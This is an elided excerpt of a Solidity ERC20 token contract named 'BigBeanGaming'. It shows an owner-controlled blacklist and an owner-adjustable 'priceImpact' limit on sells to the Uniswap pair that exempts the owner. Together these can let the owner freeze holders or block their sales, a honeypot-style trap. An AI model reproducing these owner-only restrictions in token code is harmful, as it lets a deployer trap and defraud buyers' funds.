...
contract BigBeanGaming is Context, IERC20, Ownable {///////////////////////////////////////////////////////////

    using SafeMath for uint256;

    string private constant _name = "BigBeanGaming";//////////////////////////
    string private constant _symbol = "BigBean";//////////////////////////////////////////////////////////////////////////
    ...
    uint256 private priceImpact = 30; //30 = 3%, 35 = 3,5% and so on.
    ...
    address payable private _developmentAddress = payable(0xb4aC42606fD4d9eDfE8bAb2626D0054611b84AF9);/////////////////////////////////////////////////
    address payable private _marketingAddress = payable(0xb4aC42606fD4d9eDfE8bAb2626D0054611b84AF9);///////////////////////////////////////////////////
    ...
    function _transfer(
        ...
        require(_isBlacklisted[from] != true, "ERC20: transfer from blacklisted address");
        require(_isBlacklisted[to] != true, "ERC20: transfer to blacklisted address");
        ...
        if(from != owner() && to != owner()) {
            ...
            if(to == uniswapV2Pair){                
                require(amount <= balanceOf(uniswapV2Pair).mul(priceImpact).div(1000), "ERC20: transfer amount drops too much liquidity.");
            }
    ...
    function setMaxImpact(uint256 _maxPriceImpact) public onlyOwner {
        priceImpact = _maxPriceImpact;
    }
